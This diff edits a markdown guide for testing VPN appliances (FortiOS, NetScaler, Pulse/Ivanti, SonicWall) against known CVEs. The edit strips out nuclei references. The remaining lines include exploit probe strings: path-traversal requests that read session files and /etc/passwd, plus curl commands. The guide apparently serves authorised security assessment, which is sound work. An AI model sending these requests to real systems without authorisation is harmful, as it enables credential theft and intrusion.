@@ -124,9 +124,9 @@ curl -sk 'https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE
 | CVE | Affects | Type | Test |
 |---|---|---|---|
 | **CVE-2018-13379** | FortiOS 5.4-6.0 | Path traversal — sslvpn_websession file read | `GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession` |
-| **CVE-2022-42475** | FortiOS 7.x specific | Heap overflow — pre-auth RCE | Complex exploit; test with `nuclei` template `CVE-2022-42475` |
-| **CVE-2023-27997** (XORtigate) | FortiOS various | Heap overflow — pre-auth RCE | Public PoCs exist; nuclei template available |
-| **CVE-2024-21762** | FortiOS 6.x-7.x | OOB write — pre-auth RCE | Public PoC; nuclei template `CVE-2024-21762` |
+| **CVE-2022-42475** | FortiOS 7.x specific | Heap overflow — pre-auth RCE | Complex exploit |
+| **CVE-2023-27997** (XORtigate) | FortiOS various | Heap overflow — pre-auth RCE | Public PoCs exist |
+| **CVE-2024-21762** | FortiOS 6.x-7.x | OOB write — pre-auth RCE | Public PoC |
 | **CVE-2024-55591** | FortiOS 7.0-7.4 | Auth bypass on FortiOS Node.js websocket admin interface | `GET /endpoint` on admin-interface port |
 
 ```bash
@@ -143,7 +143,7 @@ curl -sk --path-as-is 'https://target/remote/fgt_lang?lang=/../../../../////////
 | CVE | Affects | Type | Test |
 |---|---|---|---|
 | **CVE-2019-19781** (Shitrix) | ADC/Gateway 10.5-13.0 specific | Path traversal → RCE via XML upload | `GET /vpn/../vpns/cfg/smb.conf` |
-| **CVE-2022-27518** | ADC/Gateway with SAML configured | Pre-auth RCE | Complex; test with nuclei |
+| **CVE-2022-27518** | ADC/Gateway with SAML configured | Pre-auth RCE | Complex |
 | **CVE-2023-3519** | NetScaler ADC/Gateway 13.0-13.1 specific | Pre-auth RCE via crafted HTTP | Public PoCs exist |
 | **CVE-2023-4966** (Citrix Bleed) | NetScaler ADC/Gateway 13.0-14.1 | Memory disclosure → session token theft | `POST /oauth/idp/.well-known/openid-configuration` with crafted Host header — long Host header triggers memory leak in response |
 
@@ -177,7 +177,7 @@ curl -sk -X POST 'https://target/ssl-vpn/login.esp' \
 | CVE | Affects | Type | Test |
 |---|---|---|---|
 | **CVE-2019-11510** | Pulse Connect Secure 8.x-9.x | Arbitrary file read | `GET /dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/` |
-| **CVE-2021-22893** | Pulse Connect Secure 9.x | Pre-auth RCE | Complex multi-step; test with nuclei |
+| **CVE-2021-22893** | Pulse Connect Secure 9.x | Pre-auth RCE | Complex multi-step |
 | **CVE-2024-21887** | Ivanti Connect Secure 9.1-22.6 | Command injection on web component | `POST /api/v1/totp/user-backup-code/` with crafted body |
 | **CVE-2024-46805** | Ivanti Connect Secure 9.1-22.6 | Auth bypass | Combined with 21887 for full chain |
 
@@ -190,7 +190,7 @@ curl -sk --path-as-is 'https://target/dana-na/../dana/html5acc/guacamole/../../.
 
 | CVE | Affects | Type | Test |
 |---|---|---|---|
-| **CVE-2021-20016** | SMA 100 series specific firmware | SQL injection — pre-auth | nuclei template available |
+| **CVE-2021-20016** | SMA 100 series specific firmware | SQL injection — pre-auth |
 | **CVE-2024-40766** | SonicOS specific | Access-control flaw | Specific firmware versions |
 
 ---
@@ -304,20 +304,6 @@ curl -sk --path-as-is "https://$TARGET/dana-na/../dana/html5acc/guacamole/../../
 
 ---
 
-## Nuclei templates for fast triage
-
-Nuclei has high-quality templates for most of the above CVEs. Single command sweeps:
-
-```bash
-nuclei -u https://target/ \
-  -tags vpn,cisco-asa,fortinet,citrix,palo-alto,pulse-secure,sonicwall,f5 \
-  -severity high,critical -rl 5
-```
-
-Add `-as` (auto-scan) for broader vuln coverage but slower.
-
----
-
 ## Operational discipline
 
 - **Banner-stripped servers (no version disclosure)** are good defense-in-depth — record as positive finding even if no CVE found
@@ -341,7 +327,7 @@ Add `-as` (auto-scan) for broader vuln coverage but slower.
 
 - **Don't conclude "patched" from a 404 on one CVE path** — patches deploy unevenly; test 3+ CVEs per vendor
 - **Don't trust the version banner alone** — appliance vendors often backport fixes without bumping the version string
-- **Don't run heavy nuclei scans without rate-limiting** — these appliances are critical infrastructure
+- **Don't run heavy scans without rate-limiting** — these appliances are critical infrastructure
 - **Don't fingerprint by trying all CVE PoCs immediately** — start with non-disruptive HEAD + version-banner probes
 - **Don't skip SAML metadata** — even when the appliance is patched, SAML SP misconfig is its own attack surface
 
